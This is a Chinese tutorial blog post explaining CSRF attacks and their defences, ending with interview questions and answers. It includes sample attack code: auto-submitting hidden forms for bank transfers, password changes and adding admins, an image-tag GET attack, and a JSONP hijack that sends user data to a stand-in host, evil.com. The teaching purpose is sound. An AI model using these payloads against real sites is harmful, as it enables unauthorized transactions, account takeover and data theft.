---
date: 2025-12-26
author: Gaaming Zhang
isOriginal: false
article: true
category:
  - 网络
tag:
  - 网络
  - 还在施工中···
---

# CSRF攻击原理

## 概述
CSRF（Cross-Site Request Forgery，跨站请求伪造）是一种常见的Web安全漏洞，攻击者通过诱导用户在已登录的目标网站上执行非预期的操作。与XSS攻击不同，CSRF攻击不直接攻击目标网站，而是利用用户在目标网站的身份验证信息，冒充用户发送恶意请求。

### 产生背景
Web应用广泛使用Cookie进行身份验证，Cookie会自动附加到同域名的所有请求中。这种设计虽然方便了用户体验，但也带来了安全风险：攻击者可以构造恶意页面，诱导用户访问，从而利用用户的Cookie向目标网站发送请求。

### 核心特点
- **跨站点**：攻击请求来自第三方站点，而非目标站点
- **请求伪造**：攻击者伪造用户的请求，而非直接攻击目标网站
- **身份利用**：利用用户在目标网站的登录状态执行操作
- **隐蔽性强**：用户可能完全不知道自己执行了操作

### 危害程度
CSRF攻击的危害程度取决于目标网站的功能：
- **低危**：修改用户偏好设置、关注/取消关注等
- **中危**：发送消息、修改个人信息等
- **高危**：转账、修改密码、删除数据、管理员操作等

## 攻击原理

### 攻击条件
CSRF攻击成功需要满足以下条件：
1. 用户已登录目标网站，浏览器中保存了有效的Cookie
2. 目标网站没有对请求进行有效的CSRF防护
3. 用户访问了攻击者构造的恶意页面
4. 目标网站的操作可以通过GET或POST请求触发

### 攻击流程
CSRF攻击的典型流程如下：

1. **用户登录目标网站**：用户在目标网站（如bank.com）登录，浏览器保存了身份验证Cookie
2. **攻击者构造恶意页面**：攻击者创建一个包含恶意请求的页面（如evil.com）
3. **诱导用户访问恶意页面**：攻击者通过钓鱼邮件、社交媒体等方式诱导用户访问恶意页面
4. **浏览器自动发送Cookie**：恶意页面中的请求指向目标网站，浏览器自动附加用户的Cookie
5. **目标网站执行操作**：目标网站接收到请求，验证Cookie有效，执行操作
6. **攻击成功**：用户在不知情的情况下执行了非预期的操作

### HTTP请求示例

**正常请求**：
```
POST /transfer HTTP/1.1
Host: bank.com
Cookie: sessionid=abc123
Content-Type: application/x-www-form-urlencoded

to=attacker&amount=1000
```

**CSRF攻击请求**：
```
POST /transfer HTTP/1.1
Host: bank.com
Cookie: sessionid=abc123
Content-Type: application/x-www-form-urlencoded

to=attacker&amount=1000
Referer: http://evil.com/attack.html
```

## 攻击类型

### 1. GET请求CSRF
利用GET请求发起攻击，通常通过图片、iframe等方式触发。

**攻击示例**：
```html
<img src="http://bank.com/transfer?to=attacker&amount=1000" />
```

### 2. POST请求CSRF
利用POST请求发起攻击，通常通过隐藏表单、AJAX等方式触发。

**攻击示例**：
```html
<form action="http://bank.com/transfer" method="POST">
  <input type="hidden" name="to" value="attacker" />
  <input type="hidden" name="amount" value="1000" />
</form>
<script>
  document.forms[0].submit();
</script>
```

### 3. JSON Hijacking
利用JSONP或CORS漏洞劫持敏感数据。

**攻击示例**：
```html
<script>
  function steal(data) {
    // 将敏感数据发送到攻击者服务器
    fetch('http://evil.com/steal?data=' + JSON.stringify(data));
  }
</script>
<script src="http://bank.com/api/userinfo?callback=steal"></script>
```

### 4. Flash CSRF
利用Flash的跨域请求能力发起攻击。

**攻击示例**：
```actionscript
var request:URLRequest = new URLRequest("http://bank.com/transfer");
request.method = URLRequestMethod.POST;
var variables:URLVariables = new URLVariables();
variables.to = "attacker";
variables.amount = "1000";
request.data = variables;
navigateToURL(request);
```

## 常见攻击场景

### 1. 银行转账
攻击者构造恶意页面，诱导用户访问，自动发起转账请求。

**攻击代码**：
```html
<form action="https://bank.com/transfer" method="POST">
  <input type="hidden" name="account" value="attacker_account" />
  <input type="hidden" name="amount" value="10000" />
</form>
<script>
  document.forms[0].submit();
</script>
```

### 2. 修改密码
攻击者诱导用户访问恶意页面，自动修改用户密码。

**攻击代码**：
```html
<form action="https://example.com/change_password" method="POST">
  <input type="hidden" name="new_password" value="attacker_controlled" />
</form>
<script>
  document.forms[0].submit();
</script>
```

### 3. 发送消息
攻击者利用用户的身份发送垃圾消息或恶意链接。

**攻击代码**：
```html
<form action="https://social.com/send_message" method="POST">
  <input type="hidden" name="to" value="all_friends" />
  <input type="hidden" name="content" value="Click here: http://evil.com" />
</form>
<script>
  document.forms[0].submit();
</script>
```

### 4. 添加管理员
攻击者将自己添加为管理员，获取系统控制权。

**攻击代码**：
```html
<form action="https://admin.example.com/add_admin" method="POST">
  <input type="hidden" name="username" value="attacker" />
  <input type="hidden" name="role" value="admin" />
</form>
<script>
  document.forms[0].submit();
</script>
```

### 5. 购物车操作
攻击者将商品添加到用户购物车或修改订单信息。

**攻击代码**：
```html
<form action="https://shop.com/add_to_cart" method="POST">
  <input type="hidden" name="product_id" value="expensive_item" />
  <input type="hidden" name="quantity" value="100" />
</form>
<script>
  document.forms[0].submit();
</script>
```

## 攻击检测方法

### 1. 手动检测
- 检查关键操作是否有CSRF Token
- 检查Referer头验证
- 检查SameSite Cookie属性
- 使用Burp Suite等工具测试

### 2. 自动化检测
- 使用CSRFTester、OWASP ZAP等工具
- 编写自动化测试脚本
- 使用安全扫描工具

### 3. 代码审计
- 检查表单是否有CSRF Token
- 检查AJAX请求是否有CSRF Token
- 检查关键操作的防护措施

## 防护措施

### 1. CSRF Token

#### 原理
服务器为每个用户会话生成一个唯一的随机Token，在表单或请求中包含该Token，服务器验证Token的有效性。

#### 实现方式
```html
<form action="/transfer" method="POST">
  <input type="hidden" name="csrf_token" value="abc123def456" />
  <input type="text" name="to" />
  <input type="number" name="amount" />
  <button type="submit">转账</button>
</form>
```

#### 服务端验证
```python
def transfer(request):
    csrf_token = request.POST.get('csrf_token')
    if not validate_csrf_token(request, csrf_token):
        return HttpResponseForbidden('CSRF Token验证失败')
    # 执行转账操作
```

#### 注意事项
- Token应该随机且不可预测
- Token应该与用户会话绑定
- Token应该有有效期
- Token应该一次性使用或定期更新

### 2. SameSite Cookie属性

#### 原理
通过设置Cookie的SameSite属性，控制Cookie在跨站点请求中的发送行为。

#### 属性值
- **Strict**：严格模式，仅在当前站点请求中发送Cookie
- **Lax**：宽松模式，允许部分跨站点请求发送Cookie（如导航到站点的GET请求）
- **None**：允许所有跨站点请求发送Cookie，必须配合Secure属性使用

#### 实现方式
```http
Set-Cookie: sessionid=abc123; SameSite=Strict
Set-Cookie: sessionid=abc123; SameSite=Lax
Set-Cookie: sessionid=abc123; SameSite=None; Secure
```

#### 注意事项
- SameSite=Strict可能影响用户体验（如从邮件链接跳转）
- SameSite=None必须配合Secure属性使用
- 旧版本浏览器可能不支持SameSite属性

### 3. 验证Referer头

#### 原理
检查请求的Referer头，确保请求来自受信任的域名。

#### 实现方式
```python
def check_referer(request):
    referer = request.META.get('HTTP_REFERER')
    if not referer:
        return False
    referer_domain = urlparse(referer).netloc
    allowed_domains = ['example.com', 'www.example.com']
    return referer_domain in allowed_domains
```

#### 注意事项
- Referer头可能被伪造
- 某些浏览器或网络环境可能不发送Referer头
- 不能单独依赖Referer头进行防护

### 4. 双重提交Cookie

#### 原理
将CSRF Token同时存储在Cookie和请求参数中，服务器验证两者是否一致。

#### 实现方式
```javascript
// 设置Cookie
document.cookie = 'csrf_token=abc123; path=/';

// 发送请求时携带Token
fetch('/transfer', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'X-CSRF-Token': getCookie('csrf_token')
  },
  body: JSON.stringify({ to: 'user', amount: 100 })
});
```

#### 注意事项
- 需要配合SameSite属性使用
- Cookie可能被XSS攻击窃取
- 不如CSRF Token安全

### 5. 自定义HTTP头

#### 原理
使用自定义HTTP头（如X-Requested-With）验证请求来源。

#### 实现方式
```javascript
fetch('/api/data', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'X-Requested-With': 'XMLHttpRequest'
  },
  body: JSON.stringify({ data: 'value' })
});
```

#### 注意事项
- 需要配合CORS使用
- 不能单独依赖自定义头进行防护
- 适用于AJAX请求

### 6. 重新认证

#### 原理
对于敏感操作，要求用户重新输入密码或进行二次确认。

#### 实现方式
```html
<form action="/transfer" method="POST">
  <input type="hidden" name="csrf_token" value="abc123" />
  <input type="text" name="to" />
  <input type="number" name="amount" />
  <input type="password" name="password" placeholder="请输入密码确认" />
  <button type="submit">转账</button>
</form>
```

#### 注意事项
- 影响用户体验
- 适用于敏感操作
- 不能完全替代其他防护措施

### 7. 限制请求方法

#### 原理
对于修改操作，只允许POST、PUT、DELETE等请求方法，不允许GET请求。

#### 实现方式
```python
def transfer(request):
    if request.method != 'POST':
        return HttpResponseMethodNotAllowed('只允许POST请求')
    # 执行转账操作
```

#### 注意事项
- 不能单独依赖请求方法限制
- 需要配合其他防护措施使用
- GET请求应该只用于查询操作

## 最佳实践

### 1. 防护策略组合
- 使用CSRF Token作为主要防护措施
- 设置SameSite Cookie属性
- 对敏感操作要求重新认证
- 验证Referer头作为辅助防护

### 2. 安全开发规范
- 所有修改操作都应该有CSRF防护
- 使用框架提供的CSRF防护功能
- 定期进行安全测试和代码审计
- 关注安全漏洞和补丁

### 3. 用户教育
- 提醒用户不要点击可疑链接
- 提供安全提示和警告
- 允许用户查看最近的操作记录
- 提供异常操作通知

### 4. 监控和日志
- 记录所有敏感操作
- 监控异常请求模式
- 设置告警规则
- 定期审计日志

## CSRF与XSS的区别

### 攻击目标
- **CSRF**：攻击目标网站，利用用户身份
- **XSS**：攻击用户，利用网站漏洞

### 攻击方式
- **CSRF**：伪造请求，利用Cookie自动发送
- **XSS**：注入恶意脚本，执行JavaScript代码

### 防护措施
- **CSRF**：CSRF Token、SameSite Cookie、验证Referer
- **XSS**：输入过滤、输出转义、Content Security Policy

### 危害范围
- **CSRF**：只能执行用户有权限的操作
- **XSS**：可以窃取Cookie、修改页面、执行任意JavaScript

### 检测难度
- **CSRF**：较难检测，请求看起来正常
- **XSS**：较易检测，可以通过扫描工具发现

## 相关高频面试题与简答

- 问：什么是CSRF攻击？它与XSS攻击有什么区别？
  答：CSRF（Cross-Site Request Forgery，跨站请求伪造）是一种Web安全漏洞，攻击者通过诱导用户在已登录的目标网站上执行非预期的操作。与XSS攻击的区别：
  - **攻击目标**：CSRF攻击目标网站，利用用户身份；XSS攻击用户，利用网站漏洞
  - **攻击方式**：CSRF伪造请求，利用Cookie自动发送；XSS注入恶意脚本，执行JavaScript代码
  - **防护措施**：CSRF使用CSRF Token、SameSite Cookie；XSS使用输入过滤、输出转义、CSP
  - **危害范围**：CSRF只能执行用户有权限的操作；XSS可以窃取Cookie、修改页面、执行任意JavaScript

- 问：CSRF攻击的原理是什么？攻击成功需要满足哪些条件？
  答：CSRF攻击的原理是利用用户在目标网站的登录状态，通过构造恶意页面诱导用户访问，浏览器自动附加用户的Cookie发送请求，目标网站验证Cookie有效后执行操作。攻击成功需要满足以下条件：
  1）用户已登录目标网站，浏览器中保存了有效的Cookie
  2）目标网站没有对请求进行有效的CSRF防护
  3）用户访问了攻击者构造的恶意页面
  4）目标网站的操作可以通过GET或POST请求触发

- 问：如何防护CSRF攻击？
  答：防护CSRF攻击的主要方法：
  - **CSRF Token**：为每个用户会话生成唯一的随机Token，在表单或请求中包含该Token，服务器验证Token的有效性
  - **SameSite Cookie**：设置Cookie的SameSite属性，控制Cookie在跨站点请求中的发送行为（Strict、Lax、None）
  - **验证Referer头**：检查请求的Referer头，确保请求来自受信任的域名
  - **双重提交Cookie**：将CSRF Token同时存储在Cookie和请求参数中，服务器验证两者是否一致
  - **自定义HTTP头**：使用自定义HTTP头（如X-Requested-With）验证请求来源
  - **重新认证**：对于敏感操作，要求用户重新输入密码或进行二次确认
  - **限制请求方法**：对于修改操作，只允许POST、PUT、DELETE等请求方法

- 问：什么是CSRF Token？如何实现？
  答：CSRF Token是一种防护CSRF攻击的机制，服务器为每个用户会话生成一个唯一的随机Token，在表单或请求中包含该Token，服务器验证Token的有效性。实现方式：
  1）服务器生成随机Token，存储在用户会话中
  2）在表单中添加隐藏字段，包含Token值
  3）在AJAX请求中添加Token到请求头或请求体
  4）服务器接收请求时验证Token的有效性
  注意事项：Token应该随机且不可预测，与用户会话绑定，有有效期，定期更新。

- 问：Cookie的SameSite属性有哪些值？各有什么作用？
  答：SameSite属性有三个值：
  - **Strict**：严格模式，仅在当前站点请求中发送Cookie，安全性最高但可能影响用户体验
  - **Lax**：宽松模式，允许部分跨站点请求发送Cookie（如导航到站点的GET请求），平衡了安全性和用户体验
  - **None**：允许所有跨站点请求发送Cookie，必须配合Secure属性使用，适用于需要跨站点访问的场景
  SameSite属性主要用于防止CSRF攻击，推荐使用Lax作为默认值。

- 问：如何验证Referer头进行CSRF防护？有什么注意事项？
  答：验证Referer头的方法是检查请求的Referer头，确保请求来自受信任的域名。实现方式：
  1）获取请求的Referer头
  2）解析Referer头的域名
  3）验证域名是否在允许的域名列表中
  注意事项：
  - Referer头可能被伪造，不能单独依赖Referer头进行防护
  - 某些浏览器或网络环境可能不发送Referer头
  - 需要配合其他防护措施使用
  - 隐私模式下Referer头可能被移除

- 问：什么是双重提交Cookie？它有什么优缺点？
  答：双重提交Cookie是一种CSRF防护机制，将CSRF Token同时存储在Cookie和请求参数中，服务器验证两者是否一致。
  优点：
  - 实现简单，不需要服务器存储Token
  - 适用于前后端分离的应用
  缺点：
  - 需要配合SameSite属性使用
  - Cookie可能被XSS攻击窃取
  - 不如CSRF Token安全
  - 不能防止子域名攻击

- 问：如何检测CSRF漏洞？
  答：检测CSRF漏洞的方法：
  - **手动检测**：检查关键操作是否有CSRF Token，检查Referer头验证，检查SameSite Cookie属性，使用Burp Suite等工具测试
  - **自动化检测**：使用CSRFTester、OWASP ZAP等工具，编写自动化测试脚本，使用安全扫描工具
  - **代码审计**：检查表单是否有CSRF Token，检查AJAX请求是否有CSRF Token，检查关键操作的防护措施
  - **渗透测试**：模拟攻击场景，测试系统的防护能力

- 问：CSRF攻击有哪些常见场景？
  答：CSRF攻击的常见场景：
  - **银行转账**：攻击者构造恶意页面，诱导用户访问，自动发起转账请求
  - **修改密码**：攻击者诱导用户访问恶意页面，自动修改用户密码
  - **发送消息**：攻击者利用用户的身份发送垃圾消息或恶意链接
  - **添加管理员**：攻击者将自己添加为管理员，获取系统控制权
  - **购物车操作**：攻击者将商品添加到用户购物车或修改订单信息
  - **社交媒体操作**：攻击者利用用户身份发布内容、关注/取消关注等

- 问：CSRF Token和SameSite Cookie有什么区别？
  答：CSRF Token和SameSite Cookie的区别：
  - **实现方式**：CSRF Token需要在表单或请求中包含Token值；SameSite Cookie通过设置Cookie属性实现
  - **防护范围**：CSRF Token可以防护所有类型的CSRF攻击；SameSite Cookie只能防护跨站点请求
  - **兼容性**：CSRF Token兼容性较好；SameSite Cookie在旧版本浏览器中可能不支持
  - **用户体验**：CSRF Token对用户体验影响较小；SameSite=Strict可能影响用户体验
  - **推荐使用**：建议同时使用CSRF Token和SameSite Cookie，提供双重防护

- 问：如何在前端实现CSRF Token的传递？
  答：在前端实现CSRF Token传递的方法：
  - **表单提交**：在表单中添加隐藏字段，包含Token值
  - **AJAX请求**：在请求头或请求体中添加Token
  - **Cookie读取**：从Cookie中读取Token，添加到请求中
  示例代码：
  ```javascript
  // 从Cookie中读取Token
  function getCookie(name) {
    const cookies = document.cookie.split(';');
    for (let cookie of cookies) {
      const [key, value] = cookie.trim().split('=');
      if (key === name) return value;
    }
    return null;
  }

  // AJAX请求中添加Token
  fetch('/api/data', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'X-CSRF-Token': getCookie('csrf_token')
    },
    body: JSON.stringify({ data: 'value' })
  });
  ```

- 问：如何防止CSRF攻击在AJAX请求中生效？
  答：防止CSRF攻击在AJAX请求中生效的方法：
  - **CSRF Token**：在AJAX请求中添加CSRF Token到请求头或请求体
  - **自定义HTTP头**：使用自定义HTTP头（如X-Requested-With）验证请求来源
  - **SameSite Cookie**：设置Cookie的SameSite属性为Strict或Lax
  - **CORS配置**：正确配置CORS，限制允许的源
  - **预检请求**：使用OPTIONS预检请求验证请求的合法性
  注意事项：AJAX请求通常使用JSON格式，攻击者构造JSON请求较困难，但仍需防护。

- 问：CSRF攻击对GET请求和POST请求有什么区别？
  答：CSRF攻击对GET请求和POST请求的区别：
  - **攻击难度**：GET请求更容易被攻击，可以通过图片、iframe等方式触发；POST请求需要构造表单或AJAX请求
  - **攻击方式**：GET请求可以通过简单的HTML标签触发；POST请求需要JavaScript或表单自动提交
  - **防护建议**：GET请求应该只用于查询操作，不修改数据；POST请求应该用于修改操作，并添加CSRF防护
  - **浏览器行为**：GET请求更容易被缓存和预加载；POST请求不会被缓存
  最佳实践：对于修改操作，只允许POST、PUT、DELETE等请求方法，不允许GET请求。

- 问：如何处理CSRF Token失效的情况？
  答：处理CSRF Token失效的情况：
  - **重新生成Token**：当Token失效时，服务器重新生成Token并返回给客户端
  - **Token有效期**：设置合理的Token有效期，避免Token长期有效
  - **错误提示**：当Token验证失败时，返回明确的错误信息
  - **自动刷新**：在Token即将过期时，自动刷新Token
  - **重试机制**：允许用户重试操作，使用新的Token
  示例代码：
  ```javascript
  async function submitForm(data) {
    try {
      const response = await fetch('/api/submit', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'X-CSRF-Token': getCookie('csrf_token')
        },
        body: JSON.stringify(data)
      });
      if (response.status === 403) {
        // Token失效，重新获取Token
        await refreshCsrfToken();
        // 重试请求
        return submitForm(data);
      }
      return response.json();
    } catch (error) {
      console.error('请求失败:', error);
    }
  }
  ```

- 问：CSRF攻击在单页应用（SPA）中如何防护？
  答：CSRF攻击在单页应用中的防护方法：
  - **CSRF Token**：在API请求中添加CSRF Token到请求头
  - **SameSite Cookie**：设置Cookie的SameSite属性为Strict或Lax
  - **Token存储**：将Token存储在LocalStorage或SessionStorage中，而不是Cookie
  - **Token刷新**：在Token即将过期时，自动刷新Token
  - **CORS配置**：正确配置CORS，限制允许的源
  - **自定义HTTP头**：使用自定义HTTP头（如X-Requested-With）验证请求来源
  注意事项：单页应用通常使用AJAX请求，攻击者构造JSON请求较困难，但仍需防护。

## 总结
CSRF攻击是一种常见的Web安全漏洞，攻击者通过诱导用户在已登录的目标网站上执行非预期的操作。CSRF攻击利用了Cookie自动发送的特性，攻击者不需要获取用户的Cookie，只需诱导用户访问恶意页面即可。

防护CSRF攻击需要采取多种措施的组合，包括CSRF Token、SameSite Cookie、验证Referer头、双重提交Cookie、自定义HTTP头、重新认证等。其中，CSRF Token是最有效的防护措施，应该作为主要防护手段。

开发者在开发Web应用时，应该始终考虑CSRF攻击的风险，为所有修改操作添加CSRF防护。同时，应该定期进行安全测试和代码审计，及时发现和修复CSRF漏洞。用户也应该提高安全意识，不要点击可疑链接，保护自己的账户安全。

随着Web技术的发展，CSRF攻击的防护技术也在不断演进。新的技术如SameSite Cookie、CORS等为CSRF防护提供了更多的选择。开发者应该关注最新的安全技术和最佳实践，构建安全可靠的Web应用。
